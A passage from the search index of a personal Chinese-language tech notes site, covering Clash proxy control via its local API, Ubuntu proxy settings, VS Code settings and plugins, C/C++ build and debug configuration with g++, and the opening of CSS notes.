\u4e2d\u53ef\u9009\u54ea\u51e0\u4e2a\u670d\u52a1\u5668\uff0c\u4ee5\u53ca\u76ee\u524d\u6b63\u9009\u62e9\u7684\u662f\u90a3\u4e2a\u670d\u52a1\u5668\uff1a</p> <pre><code>curl -i -X GET  http://127.0.0.1:9090/proxies/Proxy\n</code></pre> <p>\u5982\u679c\u8981\u9009\u62e9\u5176\u4ed6\u670d\u52a1\u5668\uff1a</p> <pre><code>curl -X PUT http://127.0.0.1:9090/proxies/Proxy --data \"{\\\"name\\\":\\\"\u65b0\u52a0\u5761SG\\\"}\"\n</code></pre> <p>Tip</p> <p>\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u5c06 mac \u4e0a\u9009\u62e9\u597d\u7684\u914d\u7f6e config.yaml \u76f4\u63a5\u590d\u5236\u5230\u5bf9\u5e94\u7684 linux \u7684 clash \u7684\u914d\u7f6e\u6587\u4ef6\u5904\uff0c\u91cd\u65b0\u542f\u52a8\u5373\u53ef\u3002</p> <p>8. \u914d\u7f6e ubuntu \u7f51\u7edc\u4ee3\u7406</p> <p>\u4f9d\u6b21\u70b9\u51fb\uff1a\u8bbe\u7f6e-\u7f51\u7edc-\u7f51\u7edc\u4ee3\u7406</p> <p>\u9009\u62e9\u624b\u52a8\uff08manual\uff09</p> <p>HTTP \u4ee3\u7406\uff1a127.0.0.1:7890</p> <p>Socks \u4e3b\u673a\uff1a127.0.0.1:7891</p>"},{"location":"tools/vscode/config/","title":"config","text":"settings.json<pre><code>{\n  // \u989c\u8272\u4e3b\u9898\u548c\u6743\u9650\n  \"security.workspace.trust.untrustedFiles\": \"open\",\n  \"workbench.colorTheme\": \"Default Dark+\",\n  \"workbench.iconTheme\": \"material-icon-theme\",\n\n  // \u8bbe\u7f6e\u9ed8\u8ba4ITerm\u548c\u652f\u6301p10k\u4e3b\u9898\n  \"terminal.external.osxExec\": \"iTerm.app\",\n  \"terminal.integrated.fontFamily\": \"MesloLGS NF\",\n  \"terminal.integrated.defaultProfile.osx\": \"zsh\",\n\n  // java home \u8def\u5f84\n  \"java.jdt.ls.java.home\": \"/opt/homebrew/Cellar/openjdk@11/11.0.12/libexec/openjdk.jdk/Contents/Home\"\n}\n</code></pre>"},{"location":"tools/vscode/plugin/","title":"\u63d2\u4ef6","text":""},{"location":"tools/vscode/plugin/#common","title":"Common","text":"<ul> <li>IntelliJ IDEA Keybindings</li> <li>Docker</li> <li>Material Icon Theme\uff1a\u56fe\u6807\u66f4\u597d\u770b</li> <li>Path Intellisense\uff1a\u81ea\u52a8\u63d0\u793a\u8def\u5f84</li> <li>Todo-Tree\uff1a\u652f\u6301 BUG\u3001TODO\u3001FIXME\u3001HACK \u56db\u4e2a\u6807\u7b7e\u3002</li> <li>Remote -SSH\uff1assh \u8fde\u63a5\u670d\u52a1\u5668</li> <li>GitLens\uff1a\u589e\u5f3a GIT\uff0c\u770b\u63d0\u4ea4\u8bb0\u5f55</li> <li>CodeGeeX\uff1aAI \u534f\u52a9</li> <li>Prettier - Code formatter\uff1a\u683c\u5f0f\u5316</li> <li>Tabnine \uff1a\u4ee3\u7801\u667a\u80fd\u63d0\u793a</li> </ul> <pre><code>Tabnine Extension was unable to download its dependencies\n\u89e3\u51b3\u529e\u6cd5: &lt;https://github.com/codota/tabnine-vscode/issues/447&gt;\nuse clash: 7890\nhost_ip=$(cat /etc/resolv.conf |grep \"nameserver\" |cut -f 2 -d \" \")\necho $host_ip\nvscode -&gt; \u8bbe\u7f6e -&gt; \u8f93\u5165proxy\uff0c\u4fee\u6539Proxy\u4e3a\uff1ahttp://host_ip:7890\n\u5982\u679cInitializing\u5931\u8d25\uff0c\u5220\u9664\u4fee\u6539\uff0c\u6216\u5c06\u5176\u4fee\u6539\u4e3ahttp://127.0.0.1:7890\n</code></pre>"},{"location":"tools/vscode/plugin/#language","title":"Language","text":"<ul> <li>Java\uff1aExtension Pack for Java</li> <li>C/C++\uff1aC/C++ Extension Pack</li> <li>Python\uff1aPython Extension Pack</li> <li>Markdown\uff1aMarkdown All in One</li> <li>Rust\uff1aRust Extension Pack</li> <li>Move\uff1amove-analyzer</li> <li>TOML\uff1aEven Better TOML</li> <li>XML\uff1aXML Language Support by Red Hat\uff0c\u4ec5\u5b89\u88c5\u8fd9\u4e2a\u5373\u53ef\uff0c\u65e0\u9700\u5b89\u88c5 xml tools\uff01</li> <li>YAML\uff1aYAML Language Support by Red Hat</li> </ul>"},{"location":"tools/vscode/plugin/#_2","title":"\u524d\u7aef\u63d2\u4ef6","text":"<p>\u57fa\u7840\u5fc5\u5907</p> <ul> <li>JavaScript(ES6) code snippets</li> <li>HTML CSS Support\uff1aHTML CSS Support \u548c IntelliSense for CSS class names in HTML \u662f\u529f\u80fd\u5dee\u4e0d\u591a\u4e24\u4e2a\u6269\u5c55\uff0c\u6211\u66f4\u63a8\u8350\u4f7f\u7528\u524d\u8005\uff0c\u539f\u56e0\u662f\u5b83\u7684\u8d21\u732e\u8005\u4e2d\u6709 VSCode \u7684\u6838\u5fc3\u5f00\u53d1\u4eba\u5458\u3002</li> </ul> <p>\u6d41\u7545\u4e66\u5199</p> <ul> <li>Auto Rename Tag\uff1a\u5f53\u4fee\u6539\u4e00\u4e2a\u6807\u7b7e\u65f6\uff0c\u4f1a\u5bf9\u5e94\u4fee\u6539\u5176\u5bf9\u5e94\u95ed\u5408\u6807\u7b7e\u3002</li> <li>Auto Close Tag\uff1a\u81ea\u52a8\u95ed\u5408\u6807\u7b7e</li> <li>ESLint\uff1ajs \u4ee3\u7801\u68c0\u6d4b\u6280\u672f\uff0ctslint \u5df2\u88ab\u5f03\u7528\uff0c\u6574\u5408\u5230 eslint \u4e86\u3002</li> <li>prettier\uff1abeautify \u662f vscode \u5185\u7f6e\u7684\uff0c\u4f46\u76ee\u524d\u524d\u7aef\u6700\u6d41\u884c prettier</li> </ul> <pre><code>// settings.json\n// \u4fdd\u5b58\u65f6\u683c\u5f0f\u5316\n\"editor.formatOnSave\": true,\n// vscode\u7684\u9ed8\u8ba4\u7f8e\u5316\u8f6f\u4ef6\u4fee\u6539\u4e3aprettier\n\"editor.defaultFormatter\": \"esbenp.prettier-vscode\",\n</code></pre> <p>\u6846\u67b6 vue</p> <ul> <li>vue\uff1avue \u8bed\u6cd5\u9ad8\u4eae</li> <li>vue 3 snippets\uff1a\u5e38\u7528\u4ee3\u7801\u7247\u6bb5\uff0c\u5982\u5199 java \u65f6\u8f93\u5165 psvm \u53ef\u81ea\u52a8\u6269\u5c55</li> <li>vetur</li> </ul> <p>\u8c03\u8bd5</p> <ul> <li>Live server</li> </ul>"},{"location":"tools/vscode/vscode-for-c/","title":"\u4e09\u3001VSCode for C/C++","text":"<p>Warning</p> <p>\u672c\u7b14\u8bb0\u57fa\u4e8e Windows\uff0c\u7b14\u8005\u5df2\u4e0d\u518d\u4f7f\u7528</p>"},{"location":"tools/vscode/vscode-for-c/#31","title":"3.1 \u8f6f\u4ef6\u3001\u63d2\u4ef6\u51c6\u5907","text":"\u8f6f\u4ef6 \u63d2\u4ef6 VsCode C/C++ Cmake C++ Intellisense MinGW CMake CMake Tools"},{"location":"tools/vscode/vscode-for-c/#32","title":"3.2 \u626b\u63cf\u5de5\u5177\u5305","text":"<ol> <li><code>Ctrl Shift P</code></li> <li><code>CMake: Configure</code></li> <li><code>\u5de6\u4e0b\u65b9 \u626b\u63cf\u5de5\u5177\u5305 GCC 8.10</code>\uff1aGCC \u5c31\u662f\u6211\u4eec\u4e0b\u8f7d\u7684 MinGW</li> </ol>"},{"location":"tools/vscode/vscode-for-c/#33-vscode","title":"3.3 \u524d\u7f6e\u77e5\u8bc6\uff1aVSCode \u66ff\u6362\u53d8\u91cf\u542b\u4e49","text":"<p>\u5728\u7f16\u5199\u4efb\u52a1\u914d\u7f6e\u65f6\uff0c\u62e5\u6709\u4e00\u7ec4\u9884\u5b9a\u4e49\u7684\u516c\u5171\u53d8\u91cf\u901a\u5e38\u5f88\u6709\u7528\u3002VS Code \u652f\u6301\u5728 tasks.json \u6587\u4ef6\u7684\u5b57\u7b26\u4e32\u5185\u8fdb\u884c\u53d8\u91cf\u66ff\u6362\uff0c\u5e76\u6709\u4ee5\u4e0b\u9884\u5b9a\u4e49\u7684\u53d8\u91cf\u3002</p> \u53d8\u91cf \u542b\u4e49 ${workspaceFolder} \u5305\u542b tasks.json \u6587\u4ef6\u7684\u5de5\u4f5c\u533a\u6587\u4ef6\u5939\u7684\u8def\u5f84\u3002 ${workspaceRootFolderName} \u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u5939\u7684\u540d\u5b57 ${file} \u5f53\u524d\u6253\u5f00\u6b63\u5728\u7f16\u8f91\u7684\u6587\u4ef6\u540d\uff0c\u5305\u62ec\u7edd\u5bf9\u8def\u5f84\uff0c\u6587\u4ef6\u540d\uff0c\u6587\u4ef6\u540e\u7f00\u540d ${relativeFile} \u4ece\u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u5939\u5230\u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u7684\u8def\u5f84\u3002\u4f8b\u5982\uff0c\u5f53\u524d\u6253\u5f00\u7684\u662f test \u6587\u4ef6\u5939\uff0c\u5f53\u524d\u7684\u6253\u5f00\u7684\u662f test/first/second/main.c \u90a3\u4e48\u6b64\u53d8\u91cf\u4ee3\u8868\u7684\u662f first/second/main.c ${fileBasename} \u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u540d+\u540e\u7f00\u540d\uff0c\u4e0d\u5305\u62ec\u8def\u5f84 ${fileBasenameNoExtension} \u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u7684\u6587\u4ef6\u540d\uff0c\u4e0d\u5305\u62ec\u8def\u5f84\u548c\u540e\u7f00\u540d ${fileDirname} \u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u6240\u5728\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u4e0d\u5305\u62ec\u6587\u4ef6\u540d ${fileExtname} \u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u7684\u540e\u7f00\u540d ${cwd} \u4efb\u52a1\u8fd0\u884c\u5668\u542f\u52a8\u65f6\u7684\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55 ${lineNumber} the current selected line number in the active file ${env:Name} You can also reference environment variables through ${env:Name} (for example, ${env:PATH}). Be sure to match the environment variable name's casing, for example ${env:Path} on Windows."},{"location":"tools/vscode/vscode-for-c/#34-g","title":"3.4 g++\u7f16\u8bd1\u8c03\u8bd5\u6587\u4ef6","text":"<p>g++ \u548c gcc</p> <ul> <li>g++\uff1a\u7528\u4e8e\u7f16\u8bd1 c++\u6e90\u6587\u4ef6</li> <li>gcc\uff1a\u7528\u4e8e\u7f16\u8bd1 c \u6e90\u6587\u4ef6</li> </ul>"},{"location":"tools/vscode/vscode-for-c/#341-g","title":"3.4.1 g++\u7f16\u8bd1\u5355\u4e2a\u6587\u4ef6","text":""},{"location":"tools/vscode/vscode-for-c/#3412","title":"3.4.1.2 \u547d\u4ee4\u884c\u6a21\u5f0f","text":"<pre><code>g++ -g .\\hello.cpp -o myhell\n</code></pre> <p>\u8fd0\u884c\u4e0a\u8ff0\u547d\u4ee4\u540e\uff0c\u4f1a\u751f\u6210<code>myhell.exe</code>\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u547d\u4ee4\u53c2\u6570\u7b80\u4ecb\uff1a</p> <ul> <li>g++\uff1a\u662f<code>mingw64\\bin</code>\u4e2d\u7684<code>g++.exe</code>\u547d\u4ee4\uff0c\u7528\u4e8e\u7f16\u8bd1 c++\u6e90\u6587\u4ef6</li> <li>-g\uff1a\u7f16\u8bd1\u540e\u7684 exe \u6587\u4ef6\u5305\u542b\u8c03\u8bd5\u4fe1\u606f</li> <li>-o\uff1a\u4e3a\u751f\u6210\u7684 exe \u6587\u4ef6\u53d6\u4e00\u4e2a\u540d\u5b57</li> </ul> <pre><code>#\u8fd0\u884cexe\u6587\u4ef6\nPS D:\\CodeIDE\\ProjectsLearning\\VScode\\LearnC++&gt; .\\myhello.exe\nhello world!\n</code></pre> <p>\u5982\u4f55\u4f7f\u7528\u8be5\u6587\u4ef6\u8c03\u8bd5\u5c31\u4e0d\u8bf4\u4e86\uff0c\u6211\u4eec\u76f4\u63a5\u8fdb\u5165 VSCode \u6a21\u5f0f\uff01</p>"},{"location":"tools/vscode/vscode-for-c/#3412-vscode","title":"3.4.1.2 VSCode \u6a21\u5f0f","text":"<p>\u9996\u5148\u70b9\u51fb\u4e0a\u56fe\u7684<code>create a launch.json file</code>\u2014\u2014&gt;\u7136\u540e\u9009\u62e9<code>C++(GDB/LLDB)</code>\u2014\u2014&gt;\u6700\u540e\u9009\u62e9<code>g++.exe -\u751f\u6210\u548c\u8c03\u8bd5\u6d3b\u52a8\u6587\u4ef6</code></p> <p></p> <p>\u4f1a\u81ea\u52a8\u751f\u6210<code>.vscode</code>\uff0c\u5176\u4e2d\u5b58\u5728\u4e24\u4e2a\u6587\u4ef6\uff1a</p> <ul> <li><code>launch.json</code></li> </ul> <pre><code>{\n  // Use IntelliSense to learn about possible attributes.\n  // Hover to view descriptions of existing attributes.\n  // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n  \"version\": \"0.2.0\",\n  \"configurations\": [\n    {\n      \"name\": \"g++.exe - \u751f\u6210\u548c\u8c03\u8bd5\u6d3b\u52a8\u6587\u4ef6\",\n      \"type\": \"cppdbg\",\n      \"request\": \"launch\",\n      \"program\": \"${fileDirname}\\\\${fileBasenameNoExtension}.exe\",\n      \"args\": [],\n      \"stopAtEntry\": false,\n      \"cwd\": \"D:\\\\CodeIDE\\\\Environments\\\\C\\\\MinGW\\\\mingw64\\\\bin\",\n      \"environment\": [],\n      \"externalConsole\": false,\n      \"MIMode\": \"gdb\",\n      \"miDebuggerPath\": \"D:\\\\CodeIDE\\\\Environments\\\\C\\\\MinGW\\\\mingw64\\\\bin\\\\gdb.exe\",\n      \"setupCommands\": [\n        {\n          \"description\": \"\u4e3a gdb \u542f\u7528\u6574\u9f50\u6253\u5370\",\n          \"text\": \"-enable-pretty-printing\",\n          \"ignoreFailures\": true\n        }\n      ],\n      \"preLaunchTask\": \"C/C++: g++.exe build active file\"\n    }\n  ]\n}\n</code></pre> <p><code>launch.json</code>\u6587\u4ef6\u4e3b\u8981\u5173\u6ce8\u4e09\u4e2a\u53c2\u6570\uff1a</p> <ul> <li><code>\"program\": \"\\${fileDirname}\\\\${fileBasenameNoExtension}.exe\"</code>\uff0c\u8fd9\u4e2a\u53c2\u6570\u662f\u6307\u5b9a\u9700\u8981**\u8c03\u8bd5\u7684\u6587\u4ef6\u8def\u5f84**\uff0c\u5c31\u662f\u4e0a\u56fe\u4e2d\u7684<code>hello.exe</code>\u548c<code>cry.exe</code></li> <li><code>\"args\": []</code>\uff0c\u8fd9\u4e2a\u53c2\u6570\u662f main \u51fd\u6570\u4e2d\u7684\u53c2\u6570</li> <li> <p><code>\"preLaunchTask\": \"C/C++: g++.exe build active file\"</code>\uff0c\u5f53\u8c03\u8bd5\u4e00\u4e2a\u6587\u4ef6\u524d\uff0c\u4f1a\u5148\u6267\u884c\u5bf9\u5e94<code>preLaunchTask</code>\u4e2d\u7684\u503c\u7684<code>tasks.json</code>\u6587\u4ef6\u4e2d\u7684<code>label</code>\u503c\u7684 task\uff01\u53c2\u89c1\u4e0b\u56fe\u7684<code>tasks.json</code>\u6587\u4ef6\uff0c\u53ef\u4ee5\u770b\u5230\u5b83\uff1a<code>\"label\": \"C/C++: g++.exe build active file\"</code>\uff0c\u8fd9\u4e2a\u503c\u4e0e<code>preLaunchTask</code>\u76f8\u540c\uff01</p> </li> <li> <p><code>tasks.json</code></p> </li> </ul> <pre><code>{\n  \"tasks\": [\n    {\n      \"type\": \"cppbuild\",\n      \"label\": \"C/C++: g++.exe build active file\",\n      \"command\": \"D:\\\\CodeIDE\\\\Environments\\\\C\\\\MinGW\\\\mingw64\\\\bin\\\\g++.exe\",\n      \"args\": [\n        \"-g\",\n        \"${file}\",\n        \"-o\",\n        \"${fileDirname}\\\\${fileBasenameNoExtension}.exe\"\n      ],\n      \"options\": {\n        \"cwd\": \"D:\\\\CodeIDE\\\\Environments\\\\C\\\\MinGW\\\\mingw64\\\\bin\"\n      },\n      \"problemMatcher\": [\"$gcc\"],\n      \"group\": {\n        \"kind\": \"build\",\n        \"isDefault\": true\n      },\n      \"detail\": \"Task generated by Debugger.\"\n    }\n  ],\n  \"version\": \"2.0.0\"\n}\n</code></pre> <p><code>tasks.json</code>\u4e3b\u8981\u5173\u6ce8\u4e09\u4e2a\u53c2\u6570\uff1a</p> <ul> <li><code>\"label\": \"C/C++: g++.exe build active file\"</code>\uff0c\u540c\u4e0a</li> <li><code>\"command\": \"D:\\\\CodeIDE\\\\Environments\\\\C\\\\MinGW\\\\mingw64\\\\bin\\\\g++.exe\"</code>\uff0c\u8fd0\u884c g++\u547d\u4ee4</li> <li><code>\"args\"</code>\uff0c\u5176\u4e2d\u7684\u5185\u5bb9\u5c31\u662f\u547d\u4ee4\u884c\u6a21\u5f0f\u7684\u5185\u5bb9\uff0c-g \u8868\u793a\u7f16\u8bd1\u540e\u5305\u542b\u8c03\u8bd5\u4fe1\u606f\uff0c${file}\u662f\u4e00\u4e2a\u5360\u4f4d\u7b26\uff0c\u8868\u793a\u9700\u8981\u7f16\u8bd1\u7684\u6e90\u6587\u4ef6\uff0c-o \u6307\u5b9a exe \u540d\u5b57</li> </ul> <p>\u5982\u679c\u6211\u4eec\u628a<code>launch.json</code>\u4e2d\u7684<code>\"preLaunchTask\": \"C/C++: g++.exe build active file\"</code>\u5220\u9664\uff0c\u90a3\u4e48\u5728\u5bf9\u751f\u6210 exe \u6587\u4ef6 debug \u65f6\uff0c\u6c38\u8fdc debug \u7684\u662f\u66fe\u7ecf\u751f\u6210\u7684 exe \u6587\u4ef6\uff0c\u4e0d\u8bba\u4f60\u600e\u4e48\u4fee\u6539 c++\u6e90\u6587\u4ef6\uff0c\u90fd\u4e0d\u4f1a\u6539\u53d8 exe \u6587\u4ef6\uff0c\u56e0\u4e3a\u4f60\u6ca1\u6709\u6267\u884c g++\u547d\u4ee4\uff08\u4e5f\u5c31\u662f<code>tasks.json</code>\uff09\u6765\u751f\u6210\u5bf9\u5e94\u65b0\u6e90\u6587\u4ef6\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002</p>"},{"location":"tools/vscode/vscode-for-c/#342-g","title":"3.4.2 g++\u7f16\u8bd1\u591a\u4e2a\u6587\u4ef6","text":"<p>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6709\u4e00\u4e2a main \u51fd\u6570\u7684 cpp \u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e9b\u65b9\u6cd5\u7684 cpp \u6587\u4ef6\u548c\u5934\u6587\u4ef6\uff0c\u5728 main \u6587\u4ef6\u4e2d\u8c03\u7528\u4e86\u5176\u4ed6 cpp \u6587\u4ef6\u4e2d\u7684\u65b9\u6cd5\uff0c\u90a3\u4e48\u5fc5\u987b\u5c06\u8fd9\u4e9b\u6587\u4ef6\u6253\u5305\u7f16\u8bd1\uff0c\u663e\u7136\u4e0a\u8ff0\u7684\u65b9\u5f0f\u662f\u4e0d\u884c\uff01</p>"},{"location":"tools/vscode/vscode-for-c/#3421","title":"3.4.2.1 \u547d\u4ee4\u884c\u6a21\u5f0f","text":"<p>\u5047\u8bbe\u5b58\u5728\u4e09\u4e2a\u6587\u4ef6\uff1a</p> <ul> <li>hello.cpp</li> <li>add.cpp</li> <li>add.h</li> </ul> <p>\u5176\u4e2d hello.cpp \u4e2d\u6709 main \u51fd\u6570\uff0c\u8c03\u7528 add.cpp \u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u7f16\u8bd1\u8fd9\u4e24\u4e2a\u6587\u4ef6\uff1a</p> <pre><code>g++ -g .\\hello.cpp .\\add.cpp -o myhello\n</code></pre> <p><code>.h</code> \u6587\u4ef6\u4e0d\u9700\u8981\u5728\u547d\u4ee4\u4e2d\u51fa\u73b0\uff0c<code>.cpp</code> \u6587\u4ef6\u4e4b\u95f4\u4f7f\u7528\u7a7a\u683c\u9694\u5f00\u5373\u53ef</p>"},{"location":"tools/vscode/vscode-for-c/#3422-vscode","title":"3.4.2.2 VSCode \u6a21\u5f0f","text":"<p>Question</p> <p>\u5982\u4f55\u5728 VSCode \u4e2d\u8c03\u8bd5\u5df2\u7ecf\u751f\u6210\u7684 exe \u6587\u4ef6\uff1f</p> <p>\u6211\u4eec\u5df2\u7ecf\u77e5\u9053<code>launch.json</code>\u7528\u4e8e\u8c03\u8bd5\u6587\u4ef6\uff0c\u800c\u8c03\u8bd5\u6587\u4ef6\u4e4b\u524d\u4f1a\u5148\u8c03\u7528<code>tasks.json</code>\u751f\u6210 exe \u6587\u4ef6\u3002</p> <p>\u6b64\u65f6\u7531\u4e8e\u6211\u4eec\u5df2\u7ecf\u624b\u52a8\u751f\u6210\u4e86 exe \u6587\u4ef6\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5bf9<code>launch.json</code>\u6587\u4ef6\u8fdb\u884c\u4fee\u6539\u5373\u53ef\uff1a</p> <p>\u5728\u547d\u4ee4\u884c\u6a21\u5f0f\u4e2d\u6211\u4eec\u5df2\u7ecf\u751f\u6210\u4e86<code>myhello.exe</code>\u6587\u4ef6\uff0c\u6211\u4eec\u5bf9<code>launch.json</code>\u6587\u4ef6\u7684 program \u53c2\u6570\u8fdb\u884c\u4fee\u6539\uff0c\u6539\u4e3a\u6211\u4eec\u60f3\u8981\u8c03\u8bd5\u7684 exe \u6587\u4ef6\uff0c\u4e5f\u5c31\u662f<code>myhello.exe</code>\uff01</p> <pre><code>{\n  \"configurations\": [\n    {\n      \"program\": \"${workspaceFolder}\\\\myhello.exe\"\n      //\"preLaunchTask\": \"C/C++: g++.exe build active file\"\n    }\n  ]\n}\n</code></pre> <p>\u8fd9\u6837\u5b50\u5c31\u53ef\u4ee5\u8fd0\u884c\u4e86\uff0c\u4e0d\u8fc7\u6709\u4e00\u4e2a\u7f3a\u70b9\uff0c\u6bcf\u6b21\u4fee\u6539<code>hello.cpp</code>\u6216\u8005<code>add.cpp</code>\u6587\u4ef6\u4e2d\u7684\u67d0\u4e00\u4e2a\u6587\u4ef6\uff0c\u90fd\u9700\u8981\u624b\u52a8\u6765 g++\u751f\u6210\uff0c\u4e8e\u662f\u6211\u4eec\u4fee\u6539<code>tasks.json</code>\u6587\u4ef6</p> <p>\u6211\u4eec\u5df2\u77e5<code>tasks.json</code>\u6587\u4ef6\u5c31\u662f\u7c7b\u4f3c\u8fd0\u884c g++\u547d\u4ee4\u7528\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u5728\u5176\u4e2d\u4fee\u6539\u5373\u53ef\uff0c\u6bd4\u5982\u6211\u4eec\u4fee\u6539\uff1a</p> <pre><code>\"args\": [\n    \"-g\",\n    \"hello.cpp\",\n    \"add.cpp\",\n    \"-o\",\n    \"${fileDirname}\\\\myhello.exe\"\n]\n</code></pre> <p>\u6b64\u5904\u5c31\u610f\u5473\u7740\u8fd0\u884c\uff1a</p> <pre><code>g++ -g ./hello.cpp ./add.cpp -o myhello\n</code></pre> <p>\u7136\u540e\u5728<code>launch.json</code>\u6587\u4ef6\u4e2d\u542f\u52a8<code>preLaunchTask</code>\u5373\u53ef\uff01</p>"},{"location":"tools/vscode/vscode-for-c/#343","title":"3.4.3 \u603b\u7ed3","text":"<p>tasks.json \u5c31\u662f\u8fd0\u884c\u7f16\u8bd1\u547d\u4ee4\uff0c\u5982 gcc \u548c g++\uff0c\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6 exe\uff01</p> <p>launch.json \u5c31\u662f debug \u67d0\u4e2a exe \u6587\u4ef6\u7528\u7684\uff01</p> <p>\u4f46\u662f\u7531\u4e8e\u751f\u6210 exe \u7684\u6e90\u6587\u4ef6\u6211\u4eec\u4f1a\u968f\u65f6\u4fee\u6539\uff0c\u56e0\u6b64\u6211\u4eec debug \u7684 exe \u6587\u4ef6\u5fc5\u987b\u662f\u57fa\u4e8e\u6700\u65b0\u7684\u6e90\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6267\u884c debug \u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5148\u8fd0\u884c g++\u7b49\u7f16\u8bd1\u547d\u4ee4\u751f\u6210\u6700\u65b0\u7248\u672c\u7684 exe \u53ef\u6267\u884c\u6587\u4ef6\uff01</p>"},{"location":"tools/vscode/vscode-for-c/#35-cmake","title":"3.5 Cmake \u7f16\u8bd1\u8c03\u8bd5\u6587\u4ef6","text":"<p>https://cmake.org/cmake/help/v3.19/guide/tutorial/index.html</p> <p>Cmake \u7c7b\u4f3c\u4e8e g++\u547d\u4ee4\uff0c\u4e0d\u8fc7\u66f4\u52a0\u666e\u904d\u5316\uff0c\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u5e73\u53f0\u8fd0\u884c\u3002</p> <p>\u6b64\u65f6\u6211\u4eec\u7684 tasks.json \u6587\u4ef6\u4e2d\u7684 command \u9700\u8981\u6539\u6210 Cmake \u7684\u547d\u4ee4\uff01\u5177\u4f53\u4ee5\u540e\u518d\u8bf4\uff01</p>"},{"location":"web/","title":"Web","text":"<p>Abstract</p> <p>\u672c\u7ae0\u8282\u8bb0\u5f55\u524d\u7aef\u7b14\u8bb0\u3002</p>"},{"location":"web/css/","title":"CSS","text":""},{"location":"web/css/#css_1","title":"CSS \u7b80\u4ecb","text":"<p>CSS(Cascading Style Sheets\uff0c\u5c42\u53e0\u6837\u5f0f\u8868)\u3002</p> <p>HTML \u7528\u4e8e\u5b9a\u4e49\u5185\u5bb9\u7684\u7ed3\u6784\u548c\u8bed\u4e49\uff0cCSS \u7528\u4e8e\u8bbe\u8ba1\u98ce\u683c\u548c\u5e03\u5c40\u3002</p> <ul> <li>\u7ed9\u6587\u6863\u6dfb\u52a0\u6837\u5f0f\uff1a\u4f8b\u5982\u6539\u53d8\u6807\u9898\u548c\u94fe\u63a5\u7684\u989c\u8272\u53ca\u5927\u5c0f\u3002</li> <li>\u521b\u5efa\u5e03\u5c40\uff1a\u4f8b\u5982\u5c06\u4e00\u4e2a\u5355\u5217\u6587\u672c\u53d8\u6210\u5305\u542b\u4e3b\u8981\u5185\u5bb9\u533a\u57df\u548c\u5b58\u653e\u76f8\u5173\u4fe1\u606f\u7684\u4fa7\u8fb9\u680f\u533a\u57df\u7684\u5e03\u5c40\u3002</li> <li>\u7279\u6548\uff1a\u4f8b\u5982\u52a8\u753b\u3002\u67e5\u770b\u672c\u6bb5\u5185\u5bb9\u4e2d\u6240\u7ed9\u51fa\u7684\u7279\u5b9a\u6848\u4f8b\u3002</li> </ul>"},{"location":"web/css/#html-css","title":"\u5411 HTML \u6dfb\u52a0 CSS","text":"<pre><code>&lt;head&gt;\n  &lt;!-- CSS \u5185\u90e8\u6837\u5f0f\u8868 --&gt;\n  &lt;style type=\"text/css\"&gt;\n    body {\n      background-color: yellow;\n    }\n    p {\n      color: blue;\n    }\n  &lt;/style&gt;\n\n  &lt;!-- CSS \u5916\u90e8\u6837\u5f0f\u8868 --&gt;\n  &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\" /&gt;\n&lt;/head&gt;\n</code></pre>"},{"location":"web/css/#css_2","title":"CSS \u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff1f","text":"<p>\u53c2\u8003: \u6e32\u67d3\u9875\u9762\uff1a\u6d4f\u89c8\u5668\u7684\u5de5\u4f5c\u539f\u7406 - Web \u6027\u80fd | MDN</p> <ul> <li>\u6d4f\u89c8\u5668\u8f7d\u5165 HTML \u6587\u4ef6</li> <li>\u7b2c\u4e00\u6b65\uff1a\u5c06 HTML \u6587\u4ef6\u8f6c\u5316\u6210\u4e00\u4e2a DOM\uff08Document Object Model\uff09\uff0cDOM \u662f\u6587\u4ef6\u5728\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\u7684\u8868\u73b0\u5f62\u5f0f\u3002\u53ef\u4ee5\u7406\u89e3\u4e3a\u8282\u70b9\u6811\u3002</li> <li>\u6d4f\u89c8\u5668\u4e3b\u7ebf\u7a0b\u7528\u4e8e\u6784\u5efa DOM \u6811\uff0c\u540c\u65f6\uff0c\u9884\u52a0\u8f7d\u626b\u63cf\u4eea\u5c06\u89e3\u6790\u53ef\u7528\u7684\u5185\u5bb9\u5e76\u8bf7\u6c42\u9ad8\u4f18\u5148\u7ea7\u8d44\u6e90\uff0c\u5982 CSS\u3001JavaScript\u3001\u811a\u672c\u3001\u56fe\u50cf\u3002</li> <li>\u7b2c\u4e8c\u6b65\uff1a\u5c06 CSS \u6587\u4ef6\u8f6c\u5316\u4e3a CSSOM(CSS Object Model)\u3002CSSOM \u662f\u6811\u5f62\u5f62\u5f0f\u7684\u6240\u6709 CSS \u9009\u62e9\u5668\u548c\u6bcf\u4e2a\u9009\u62e9\u5668\u7684\u76f8\u5173\u5c5e\u6027\u7684\u6620\u5c04\uff0c\u5177\u6709\u6811\u7684\u6839\u8282\u70b9\uff0c\u540c\u7ea7\uff0c\u540e\u4ee3\uff0c\u5b50\u7ea7\u548c\u5176\u4ed6\u5173\u7cfb\u3002</li> <li>\u5f53 CSS \u88ab\u89e3\u6790\u5e76\u521b\u5efa CSSOM \u65f6\uff0c\u5176\u4ed6\u8d44\u6e90\uff0c\u5305\u62ec JavaScript \u6587\u4ef6\u6b63\u5728\u4e0b\u8f7d\uff08preload scanner\uff09\u3002JavaScript 